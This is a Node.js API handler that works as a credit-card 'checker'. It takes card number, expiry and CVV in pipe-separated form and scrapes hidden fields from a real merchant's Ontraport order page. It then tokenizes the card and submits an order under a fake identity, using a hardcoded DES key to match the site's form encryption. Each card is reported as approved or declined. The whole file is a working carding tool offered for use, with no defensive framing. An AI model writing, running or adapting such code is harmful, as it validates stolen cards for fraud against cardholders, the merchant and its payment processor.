import fetch from 'node-fetch';
import crypto from 'crypto';

export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const { cc } = req.body;
    const result = await ontraportCheck(cc);
    return res.status(200).json(result);
}

async function ontraportCheck(ccInput) {
    const [number, month, year, cvv] = ccInput.split('|');
    const cleanNumber = number.replace(/\D/g, '');
    const cleanMonth = month.padStart(2, '0');
    const cleanYear = year.length === 2 ? `20${year}` : year;
    const cleanCVV = cvv;
    const year2 = cleanYear.slice(-2);

    function desEncrypt(key, data) {
        const cipher = crypto.createCipheriv('des-ecb', Buffer.from(key, 'utf8'), null);
        let encrypted = cipher.update(data, 'utf8', 'hex');
        encrypted += cipher.final('hex');
        return '0x' + encrypted;
    }

    function encryptForm(dataDict) {
        return desEncrypt('Un1cOrns', JSON.stringify(dataDict));
    }

    function extractHidden(html, name) {
        const regex = new RegExp(`name="${name}"[^>]*value="([^"]*)"`);
        const match = html.match(regex);
        return match ? match[1] : '';
    }

    const urlPage = 'https://kiyosakiresearch.com/TKL-OF';

    // 1. GET page
    const sessionRes = await fetch(urlPage, {
        headers: {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        }
    });

    if (sessionRes.status !== 200) {
        return { status: 'declined', message: `HTTP ${sessionRes.status}` };
    }

    const html = await sessionRes.text();

    // 2. Extract iframe params
    const iframeMatch = html.match(/https:\/\/forms\.ontraport\.com\/v2\.4\/ccpci\/www\/ccelt\.php\?([^"]+)/);
    if (!iframeMatch) {
        return { status: 'declined', message: 'iframe not found' };
    }

    const iframeParams = new URLSearchParams(iframeMatch[1].replace(/&amp;/g, '&'));
    const aid = iframeParams.get('aid');
    const blockId = iframeParams.get('blockId');
    const hashVal = iframeParams.get('hash') || '';

    if (!aid || !blockId) {
        return { status: 'declined', message: 'aid/blockid not found' };
    }

    // 3. Extract hidden fields
    const uid = extractHidden(html, 'uid');
    const mopsbbk = extractHidden(html, 'mopsbbk');
    const mopbelg = extractHidden(html, 'mopbelg');
    let mrOpsblck = extractHidden(html, 'mr_opsblck');
    let sess_ = extractHidden(html, 'sess_');

    if (!uid || !mopsbbk || !mopbelg) {
        return { status: 'declined', message: 'hidden fields not found' };
    }

    if (!mrOpsblck) {
        mrOpsblck = '0xba5c1d70f2e284b38030e28edccecf20478d9ea257301d3271e985728953812f765da1ecbeff26547d6f83f00679d993422992185b368b003baff9b197afedb0820fb55d6522bf51';
    }
    if (!sess_) sess_ = '';

    // 4. Get token
    const tokenRes = await fetch('https://forms.ontraport.com/v2.4/ccpci/www/tokenize.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://forms.ontraport.com',
            'Referer': `https://forms.ontraport.com/v2.4/ccpci/www/ccelt.php?aid=${aid}&blockId=${blockId}&hash=${hashVal}`
        },
        body: new URLSearchParams({
            payment_name: '',
            payment_number: cleanNumber,
            payment_expire_month: cleanMonth,
            payment_expire_year: year2,
            payment_code: cleanCVV,
            aid: aid,
            blockId: blockId,
            hash: hashVal
        })
    });

    let token = '';
    try {
        const tokenData = await tokenRes.json();
        token = tokenData.token || '';
    } catch (_) {}

    // 5. Build form
    const formData = {
        firstname: 'John',
        lastname: 'Doe',
        email: `user${Math.floor(Math.random() * 99999)}@gmail.com`,
        sms_number: '1234567890',
        address: '123 Main St',
        address2: '',
        country: 'US',
        state: 'CA',
        city: 'Los Angeles',
        zip: '90210',
        shipping_same_as_billing: 'off',
        shipping_address1: '',
        shipping_address2: '',
        shipping_city: '',
        shipping_state: '',
        shipping_country: '',
        shipping_zip: '',
        f1806: 'on',
        mr_opsblck: mrOpsblck,
        orderform_block: 'true',
        mopsbbk: mopsbbk,
        mopbelg: mopbelg,
        uid: uid,
        afft_: '',
        aff_: '',
        sess_: sess_,
        ref_: '',
        own_: '',
        oprid: '',
        contact_id: '',
        utm_source: '',
        utm_medium: '',
        utm_term: '',
        utm_content: '',
        utm_campaign: '',
        referral_page: '',
        _op_gclid: '',
        _op_gcid: '',
        _op_gsid: '',
        _op_gsn: '',
        _fbc: '',
        _fbp: '',
        _op_li_fat_id: '',
        _op_last_gclid: '',
        _op_last_gbraid: '',
        _op_last_wbraid: '',
        _op_last_google_click_at: '',
        visiting_contact_id: '0',
        card_number: cleanNumber,
        uses_external_payment_element: '',
        external_payment_element_token: token,
        payment_expire_month: cleanMonth,
        payment_expire_year: year2,
        payment_code: cleanCVV
    };

    const encryptedHash = encryptForm(formData);
    const mrRand = Math.floor(Math.random() * 9000000) + 1000000;

    // 6. Submit
    const finalRes = await fetch('https://forms.ontraport.com/v2.4/cc_verify.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://forms.ontraport.com',
            'Referer': `https://forms.ontraport.com/v2.4/cc_verify.php?mr_rand=${mrRand}&uid=${uid}&submitAttempts=1&parent_url=${encodeURIComponent(urlPage)}`
        },
        body: new URLSearchParams({
            hash: encryptedHash,
            mr_rand: mrRand,
            uid: uid,
            submitAttempts: '1',
            parent_url: urlPage
        })
    });

    const finalText = await finalRes.text();

    // 7. Parse result
    const msgMatch = finalText.match(/const message = '([^']+)'/);
    if (msgMatch) {
        try {
            const parsed = JSON.parse(msgMatch[1].replace(/\\'/g, "'"));
            if (parsed.result_code === 0 || parsed.result_code === '0') {
                return {
                    status: 'approved',
                    message: parsed.message || 'approved'
                };
            } else {
                return {
                    status: 'declined',
                    message: parsed.message || 'declined'
                };
            }
        } catch (_) {
            return {
                status: 'declined',
                message: msgMatch[1]
            };
        }
    }

    if (finalText.includes('Thank You')) {
        return { status: 'approved', message: 'approved' };
    }

    return {
        status: 'declined',
        message: finalText.slice(0, 60)
    };
}
